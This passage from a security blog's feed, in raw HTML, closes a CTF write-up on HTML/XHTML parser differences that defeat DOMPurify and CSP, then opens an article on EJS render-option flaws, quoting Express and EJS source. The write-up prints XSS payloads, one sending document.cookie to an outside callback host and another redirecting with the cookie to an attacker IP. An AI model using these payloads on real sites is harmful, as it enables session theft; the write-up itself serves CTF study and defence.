class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The iframe and base that were originally inside the attribute come out.</p><p>We need the base because when we encounter CSP like <code>script-src &#39;self&#39;</code>, the first instinct is to use <code>&lt;iframe srcdoc&gt;</code> with a script gadget to bypass it. However, in this question, due to the limitation of xhtml, <code>&lt;</code> cannot be present in attributes, so we need to use the upcoming <code>report.js</code> together with base to change the path.</p><p>In the <a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge">author’s writeup</a>, there are several other solutions given, each of which is quite interesting.</p><p>The first one takes advantage of the fact that HTML ignores <code>&lt;!--</code> inside style tags, but xhtml doesn’t, to create a difference:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">a</span> <span class="token punctuation">&#123;</span> <span class="token property">color</span><span class="token punctuation">:</span> &lt;!--<span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-->&lt;/style>&lt;base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' /><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The second one exploits the fact that DOMPurify checks for valid HTML tags when detecting mXSS, which need to be ASCII alphanumeric, but XML actually allows more characters:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;<span class="token property">ø</span><span class="token punctuation">:</span>base id=<span class="token string">"giotino"</span> <span class="token property">xmlns</span><span class="token punctuation">:</span>ø=<span class="token string">"http://www.w3.org/1999/xhtml"</span> href=<span class="token string">"/**/=1;alert(document.cookie);//"</span> /></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>So it’s fine in an HTML context, but in xhtml, it will still be parsed as a base tag.</p><p>The third one looks similar to the first one, but the first one is much simpler. It goes like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>In HTML, it’s just a style tag + an a tag + two style tags. But in xhtml, the <code>&lt;!-- --&gt;</code> inside the style is also considered a comment, so it becomes:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;base href=<span class="token string">'/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'</span>>&lt;/base></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>From the desired effect he wants to achieve, it seems that it can be simplified like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.&lt;/p&gt;
&lt;p&gt;Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Inconsistent order of POST data parsing between Flask and PHP&lt;/li&gt;
&lt;li&gt;iframe CSP blocking certain script loads&lt;/li&gt;
&lt;li&gt;CSRF bypass using HEAD method&lt;/li&gt;
&lt;li&gt;Accessing parent origin using &lt;code&gt;location.ancestorOrigins&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Changing iframe location doesn’t affect the src&lt;/li&gt;
&lt;li&gt;Angular CSP bypass gadget in recaptcha URL&lt;/li&gt;
&lt;li&gt;Restoring input using &lt;code&gt;document.execCommand(&amp;#39;undo&amp;#39;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;X-HTTP-Method-Override&lt;/li&gt;
&lt;li&gt;Differences between HTML and XHTML parsers&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>EJS Vulnerabilities in CTF</title>
    <link href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/"/>
    <id>https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</id>
    <published>2023-06-22T06:10:44.000Z</published>
    <updated>2023-06-22T14:23:59.577Z</updated>
    
    <content type="html"><![CDATA[<p>Originally, I intended to write this article from a developer’s perspective. However, due to time constraints, I will first write a CTF-oriented article to record this issue. I will write from a developer’s perspective when I have more time.</p><p>In short, this article discusses the problems caused by using the following pattern:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2><span id="previous-ctf-challenges">Previous CTF challenges</span></h2><p>There are two types of EJS-related challenges that have been created in CTFs. The first type is where you can control the second parameter of the render function, as shown above. The second type is where you cannot control the second parameter, but there is a prototype pollution vulnerability.</p><p>For the first type, I personally think that EJS’s handling of parameters is problematic. You may think that only data is passed in, but in fact, options and data are passed together. Therefore, you can modify options to control some execution processes and achieve RCE.</p><p>For the second type, the main idea is to pollute <code>outputFunctionName</code> through prototype pollution, and then rely on EJS’s underlying code to concatenate JS code to achieve RCE.</p><p>However, EJS has added checks for <code>outputFunctionName</code> to ensure that the input is a valid variable name.</p><p>This article mainly discusses the first type of situation.</p><p>Below are some related challenges that have appeared in the past. In the early days, prototype pollution was the main focus, but recently, more challenges are more about passing an object.</p><ul><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/06/19/120016#Web-127-CODEGATE-Music-Player-30-solves">Codegate CTF 2023 Preliminary - Music Player</a></li><li><a href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/express-javascript-security">SEETF 2023 - Express JavaScript Security</a></li><li><a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">justCTF 2023 - Perfect Product</a></li><li><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">hxp CTF 2022 - valentine</a></li><li><a href="https://github.com/aszx87410/ctf-writeups/issues/35">Pwn2Win CTF 2021 - Illusion</a></li><li><a href="https://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md">AIS3 EOF CTF 2019 Quals - echo</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">XNUCA 2019 Qualifier - hardjs</a></li></ul><h2><span id="root-cause">Root Cause</span></h2><p>After calling <code>res.render()</code>, it will first go to <a href="https://github.com/expressjs/express/blob/4.18.2/lib/response.js#L1016">express&#x2F;lib&#x2F;response.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">.</span>app<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">;</span>  <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge res.locals</span>  opts<span class="token punctuation">.</span>_locals <span class="token operator">=</span> self<span class="token punctuation">.</span>locals<span class="token punctuation">;</span>  <span class="token comment">// default callback to respond</span>  done <span class="token operator">=</span> done <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> req<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    self<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render</span>  app<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> opts<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then, let’s check <code>app.render</code> in <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L548">express&#x2F;lib&#x2F;application.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> engines <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>engines<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options<span class="token punctuation">;</span>  <span class="token keyword">var</span> renderOptions <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> view<span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge app.locals</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// merge options._locals</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge options</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// set .cache unless explicitly provided</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// primed cache</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    view <span class="token operator">=</span> cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// view</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> View <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">defaultEngine</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">engines</span><span class="token operator">:</span> engines    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> dirs <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span>root<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span>        <span class="token operator">?</span> <span class="token string">'directories "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'", "'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'" or "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">[</span>view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'"'</span>        <span class="token operator">:</span> <span class="token string">'directory "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root <span class="token operator">+</span> <span class="token string">'"'</span>      <span class="token keyword">var</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Failed to lookup view "'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'" in views '</span> <span class="token operator">+</span> dirs<span class="token punctuation">)</span><span class="token punctuation">;</span>      err<span class="token punctuation">.</span>view <span class="token operator">=</span> view<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// prime the cache</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> view<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// render</span>  <span class="token function">tryRender</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> renderOptions<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Finally, <code>tryRender</code> is called, and the code is in <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L655">express&#x2F;lib&#x2F;application.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tryRender</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    view<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This <code>view.render</code> will call the <code>__express</code> method inside the view engine, and this method in EJS is <code>renderFile</code>:</p><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L926">ejs&#x2F;lib&#x2F;ejs.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Express.js support. * * This is an alias for &#123;@link module:ejs.renderFile&#125;, in order to support * Express.js out-of-the-box. * * @func */</span>exports<span class="token punctuation">.</span>__express <span class="token operator">=</span> exports<span class="token punctuation">.</span>renderFile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#441">renderFile</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">renderFile</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> cb<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">filename</span><span class="token operator">:</span> filename<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> data<span class="token punctuation">;</span>  <span class="token keyword">var</span> viewOpts<span class="token punctuation">;</span>  <span class="token comment">// Do we have a callback?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> arguments<span class="token punctuation">[</span>arguments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cb <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Do we have data/opts?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Should always have data obj</span>    data <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Normal passed opts (data obj + opts obj)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Use shallowCopy so we don't pollute passed in opts obj with new vals</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Special casing for Express (settings + opts-in-data)</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Express 3 and 4</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Pull a few things from known locations</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>        <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>        viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Express 2 and lower, values set in app.locals, or people who just</span>      <span class="token comment">// want to pass options in their data. NOTE: These values will override</span>      <span class="token comment">// anything previously set in settings  or settings['view options']</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    opts<span class="token punctuation">.</span>filename <span class="token operator">=</span> filename<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    data <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">createNullProtoObjWherePossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">tryHandleCache</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> cb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" 